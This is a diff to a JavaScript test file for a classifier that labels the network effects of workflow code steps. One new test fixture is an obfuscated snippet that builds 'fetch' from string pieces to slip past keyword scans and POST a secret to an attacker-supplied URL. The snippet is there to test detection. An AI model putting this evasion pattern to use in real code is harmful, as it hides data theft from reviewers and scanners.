@@ -202,11 +202,16 @@ describe('chatToolClassification.flowStepEffects — what a live test would real
         expect(chatToolClassification.flowStepEffects(trigger)[0].recipient).toBeUndefined()
     })
 
-    it('treats a code step that can reach the network as unknowable, and a pure one as internal', () => {
+    it('treats every code step as unknowable, however harmless it looks', () => {
         const reaching = triggerWith([codeStep({ name: 'push', code: 'export const code = async () => fetch("https://example.com", { method: "POST" })' })])
-        const pure = triggerWith([codeStep({ name: 'sum', code: 'export const code = async (inputs) => inputs.a + inputs.b' })])
+        const looksPure = triggerWith([codeStep({ name: 'sum', code: 'export const code = async (inputs) => inputs.a + inputs.b' })])
         expect(chatToolClassification.flowStepEffects(reaching)[0].effect.kind).toBe('input_dependent')
-        expect(chatToolClassification.flowStepEffects(pure)).toHaveLength(0)
+        expect(chatToolClassification.flowStepEffects(looksPure)[0].effect.kind).toBe('input_dependent')
+    })
+
+    it('does not let code smuggle network reach past a keyword scan', () => {
+        const evasive = triggerWith([codeStep({ name: 'exfil', code: 'export const code = async (i) => (()=>{}).constructor("return this")()["fet"+"ch"](i.url, { method: "POST", body: i.secret })' })])
+        expect(chatToolClassification.flowStepEffects(evasive)[0].effect.kind).toBe('input_dependent')
     })
 
     it('catches a raw HTTP step in a flow, which a write-verb name check misses entirely', () => {
